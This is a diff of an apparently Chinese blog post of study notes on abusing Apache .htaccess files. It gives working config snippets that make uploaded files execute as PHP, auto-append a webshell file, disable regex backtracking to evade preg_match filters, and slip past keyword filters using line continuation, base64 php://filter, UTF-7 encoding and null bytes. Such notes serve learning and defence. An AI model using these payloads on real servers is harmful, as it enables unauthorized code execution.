@@ -317,16 +317,16 @@
 &lt;/IfModule&gt;</code></pre>
 <p>通过FilesMath匹配文件后缀，其默认配置是当匹配到<code>phar</code>、<code>php</code>、<code>phtml</code>时，都将其作为php来执行，其中SetHandler就是设置解析方式</p>
 <p>例如在<code>1.phar</code>中写入<code>&lt;?=phpinfo();</code></p>
-<p>![截屏2020-08-16 下午3.20.31](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午3.20.31.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%883.20.31.png" alt="截屏2020-08-16 下午3.20.31"></p>
 <h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h2><p>👇编辑<code>.htaccess</code></p>
 <pre><code>SetHandler application/x-httpd-php</code></pre>
 <p>此时当前目录及其子目录下所有文件都会被当做php解析</p>
-<p>![截屏2020-08-16 下午4.33.03](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午4.33.03.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%884.33.03.png" alt="截屏2020-08-16 下午4.33.03"></p>
 <p>除此之外，可以将当前目录下文件都当做文本解析，这样便可获得文件源码</p>
 <pre><code>&lt;FilesMatch &quot;\.ph.*$&quot;&gt;
 SetHandler text/plain
 &lt;/FilesMatch&gt;</code></pre>
-<p>![截屏2020-08-16 下午8.08.39](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午8.08.39.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%888.08.39.png" alt="截屏2020-08-16 下午8.08.39"></p>
 <p><strong>非预期事件：</strong>在使用firefox时出现一个非常神奇的情况，本人在关闭8080端口后，依然可以访问<code>http://127.0.0.1:8080/index.php</code>，在清除缓存后，问题得以解决</p>
 <p>还可以通过设置<code>server-status</code>查看服务器状态信息以及访问站点的记录</p>
 <p><strong>server-status</strong></p>
@@ -341,15 +341,15 @@ SetHandler text/plain
 <p>👇编辑.htaccess</p>
 <pre><code>AddType application/x-httpd-php .a</code></pre>
 <p>便会将以<code>.a</code>为后缀的文件解析为php</p>
-<p>![截屏2020-08-16 下午9.15.32](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午9.15.32.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%889.15.32.png" alt="截屏2020-08-16 下午9.15.32"></p>
 <h2 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h2><p>在学习此方法之前先了解点理论基础</p>
-<p>![截屏2020-08-16 下午9.25.24](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午9.25.24.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%889.25.24.png" alt="截屏2020-08-16 下午9.25.24"></p>
 <p><strong>❗️注意事项：</strong>php_value的使用条件是在PHP作为Apache模块；也就是说在Apache以FastCGI模式运行条件下，php_value失效，滥用会导致服务器报错</p>
 <p>👇查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">配置可被设定的范围</a></p>
-<p>![截屏2020-08-16 下午9.18.49](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午9.18.49.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%889.18.49.png" alt="截屏2020-08-16 下午9.18.49"></p>
 <p>从上图可知，<code>.htaccess</code>可以使两种配置模式生效：<code>PHP_INI_PREDIR</code>和<code>PHP_INI_ALL</code></p>
 <p>👇学习如何利用<code>php_value</code></p>
-<p>![截屏2020-08-16 下午9.27.20](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午9.27.20.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%889.27.20.png" alt="截屏2020-08-16 下午9.27.20"></p>
 <p>接着查看<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">php.ini配置选项列表</a>，从中寻找可利用的配置项</p>
 <ul>
 <li><code>auto_prepend_file</code>：指定一个文件，在主文件解析之前自动解析</li>
@@ -362,16 +362,16 @@ php_value auto_append_file /var/www/html/webshell 👈 绝对路径
 # webshell
 i am hacker</code></pre>
 <p>此时随便访问一个php文件</p>
-<p>![截屏2020-08-16 下午10.40.52](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午10.40.52.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8810.40.52.png" alt="截屏2020-08-16 下午10.40.52"></p>
 <p><strong>非预期事件：</strong>这使用绝对路径，如果按原文中的相对路径文件会包含失败；但其实大多情况相对路径就可以成功</p>
 <p>通过设置这两个选项进行文件包含再结合相关的php协议流，可用来绕过对一些关键字的检测</p>
-<h3 id="修改配置绕过preg-match"><a href="#修改配置绕过preg-match" class="headerlink" title="修改配置绕过preg_match()"></a>修改配置绕过preg_match()</h3><p>![截屏2020-08-16 下午10.58.21](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午10.58.21.png)</p>
+<h3 id="修改配置绕过preg-match"><a href="#修改配置绕过preg-match" class="headerlink" title="修改配置绕过preg_match()"></a>修改配置绕过preg_match()</h3><p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8810.58.21.png" alt="截屏2020-08-16 下午10.58.21"></p>
 <p>❗️php手册中英文关于<code>pcre.backtrack_limit</code>的<code>default</code>值不一致</p>
-<p>![截屏2020-08-16 下午10.59.59](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午10.59.59.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8810.59.59.png" alt="截屏2020-08-16 下午10.59.59"></p>
 <p>👇编辑.htaccess</p>
 <pre><code>php_value pcre.backtrack_limit 0
 php_value pcre.jit 0</code></pre>
-<p>![截屏2020-08-16 下午11.13.58](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午11.13.58.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8811.13.58.png" alt="截屏2020-08-16 下午11.13.58"></p>
 <h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>根据之前学习的文章了解相关原理后，来学习一下如何通过调用特定的CGI程序来执行任意系统命令</p>
 <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.确保.htaccess会被解析</p>
 <p>2.cgi_module被加载</p>
@@ -397,7 +397,7 @@ AddHandler fcgid-script .abc</code></pre>
 <li><code>Order allow,deny</code> - 中间逗号有空格都会出错；先检查禁止设定，没有禁止的全部允许；apache会按照order决定最后使用哪一条规则</li>
 <li><code>Allow from all</code> - 开放所有内容的访问权，所以ip都可以访问</li>
 </ul>
-<p>![截屏2020-08-16 下午11.38.22](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午11.38.22.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8811.38.22.png" alt="截屏2020-08-16 下午11.38.22"></p>
 <h3 id="使用-htaccess-shell"><a href="#使用-htaccess-shell" class="headerlink" title="使用.htaccess shell"></a>使用.htaccess shell</h3><p>👇<code>.htaccess文件</code>，首先设置了禁用拒绝规则；接着用<code>SetHandler</code>将所有文件作为php解析，最后写入php代码，开头用<code>#</code>注释掉，这样便可成功解析<code>.htaccess</code>然后解析php</p>
 <pre><code>&lt;Files ~ &quot;.htaccess&quot;&gt;
     Require all granted
@@ -406,19 +406,19 @@ AddHandler fcgid-script .abc</code></pre>
 &lt;/Files&gt;
 SetHandler application/x-httpd-php
 # &lt;?php phpinfo(); ?&gt;</code></pre>
-<p>![截屏2020-08-16 下午11.42.47](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午11.42.47.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8811.42.47.png" alt="截屏2020-08-16 下午11.42.47"></p>
 <h1 id="Bypass方式"><a href="#Bypass方式" class="headerlink" title="Bypass方式"></a>Bypass方式</h1><h2 id="关键字检测"><a href="#关键字检测" class="headerlink" title="关键字检测"></a>关键字检测</h2><p>如果过滤了<code>.htaccess</code>常用关键字，此时可以使用反斜线来绕过对关键字的过滤，<strong>反斜线后需要加上换行符，并且反斜线前和关键字无空格</strong></p>
 <p>👇编辑.htaccess文件</p>
 <pre><code>AddT\
 ype application/x-httpd-php .a</code></pre>
-<p>![截屏2020-08-16 下午11.45.59](学习利用-htaccess的bypass技巧/截屏2020-08-16 下午11.45.59.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-16%20%E4%B8%8B%E5%8D%8811.45.59.png" alt="截屏2020-08-16 下午11.45.59"></p>
 <p>如果检测不能含有<code>&lt;?</code>等php字符串，那么此时可先将shell字符串进行编码，然后在文件包含时通过<code>php://filter</code>解码</p>
 <p>👇编辑.htaccess文件</p>
 <pre><code>AddType application/x-httpd-php .a
 php_value auto_append_file php://filter/convert.base64-decode/resource=1.a</code></pre>
-<p>![截屏2020-08-17 上午8.45.46](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午8.45.46.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%888.45.46.png" alt="截屏2020-08-17 上午8.45.46"></p>
 <p><code>php_flag zend.multibyte 1</code>结合<code>php_value zend.script_encoding &quot;UTF-7&quot;</code>绕过尖括号过滤</p>
-<p>![截屏2020-08-17 上午8.49.25](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午8.49.25.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%888.49.25.png" alt="截屏2020-08-17 上午8.49.25"></p>
 <p>👇编辑.htaccess和<code>index.php</code></p>
 <pre><code># .htaccess
 php_flag zend.multibyte 1
@@ -426,13 +426,13 @@ php_value zend.script_encoding &quot;UTF-7&quot;
 
 # index.php
 +ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs</code></pre>
-<p>![截屏2020-08-17 上午9.58.56](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午9.58.56.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%889.58.56.png" alt="截屏2020-08-17 上午9.58.56"></p>
 <p><strong>❗️注意事项：</strong>👆配置完成后php可以额外解析<code>UTF-7</code>编码的字符串，同时也不影响自身原本代码执行</p>
 <pre><code class="php">&lt;?php
 echo &#39;hacker&#39;.&quot;&lt;hr&gt;&quot;;
 echo+ACA-&#39;hello,+ACA-world&#39;+ADs-
 ?&gt;</code></pre>
-<p>![截屏2020-08-24 下午12.28.29](学习利用-htaccess的bypass技巧/截屏2020-08-24 下午12.28.29.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8B%E5%8D%8812.28.29.png" alt="截屏2020-08-24 下午12.28.29"></p>
 <p><strong>非预期事件：</strong>这次测验真的特别奇怪，这次在ubuntu上一直无法复现成功，在docker中则可以</p>
 <h2 id="拼接无用字符串"><a href="#拼接无用字符串" class="headerlink" title="拼接无用字符串"></a>拼接无用字符串</h2><p>可以使用<code>#</code>来注释后面拼接的多余内容，**<code>#</code>需要和前面的内容隔一个空格，并且只能注释一行内容**，可以使用反斜线来转义换行符，从而注释多行内容</p>
 <p>👇<code>.htaccess</code>文件可以生效</p>
@@ -440,16 +440,16 @@ echo+ACA-&#39;hello,+ACA-world&#39;+ADs-
 ype application/x-httpd-php .a #\
 asdf\
 asdf</code></pre>
-<p>![截屏2020-08-17 上午10.05.13](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午10.05.13.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%8810.05.13.png" alt="截屏2020-08-17 上午10.05.13"></p>
 <p>除了<code>#</code>外，<code>0x00</code>也可以当注释符，使用<code>write.php</code>脚本写入<code>.htaccess</code></p>
 <pre><code class="php">&lt;?php
 $data = urldecode(&#39;AddType application/x-httpd-php .a%0a%00asdf&#39;);
 file_put_contents(&#39;.htaccess&#39;, $data);</code></pre>
-<p>![截屏2020-08-17 上午10.05.13](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午10.05.13.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%8810.05.13.png" alt="截屏2020-08-17 上午10.05.13"></p>
 <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>这次复现中还是遇到一些神奇的问题的，比如docker环境中<code>.htaccess</code>写入即可生效，而ubuntu则需要对apache进行一些配置才可以</p>
 <p>网上大多教程表示修改<code>000-default.conf</code>中的<code>AllowOverride</code>；但由于apache版本不同，方法不兼容</p>
 <p>👇Ubuntu启用.htaccess</p>
-<p>![截屏2020-08-17 上午10.31.54](学习利用-htaccess的bypass技巧/截屏2020-08-17 上午10.31.54.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/%E6%88%AA%E5%B1%8F2020-08-17%20%E4%B8%8A%E5%8D%8810.31.54.png" alt="截屏2020-08-17 上午10.31.54"></p>
 <p>👇Mac启用.htaccess</p>
 <pre><code class=".htaccess">LoadModule rewrite_module lib/httpd/modules/mod_rewrite.so
 ...
@@ -459,7 +459,7 @@ file_put_contents(&#39;.htaccess&#39;, $data);</code></pre>
     Require all granted
 &lt;/Directory&gt;</code></pre>
 <p>还要注意的一点就是如果使用firefox浏览器遇到界面不变化的情况时八成清理浏览器缓存就可以解决</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/205098" target="_blank" rel="noopener">.htaccess利用与Bypass方式总结</a></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/205098" target="_blank" rel="noopener">.htaccess利用与Bypass方式总结</a></p>
 <p><a href="https://www.cnblogs.com/top5/archive/2009/09/22/1571709.html" target="_blank" rel="noopener">Apache的Order Allow,Deny 详解</a></p>
 <p><a href="https://qastack.cn/webmasters/61009/how-to-enable-use-of-htaccess-in-apache-on-ubuntu" target="_blank" rel="noopener">如何在Ubuntu上的Apache中启用.htaccess</a></p>
 <p><a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">Apache中.htaccess文件利用的总结与新思路拓展</a></p>
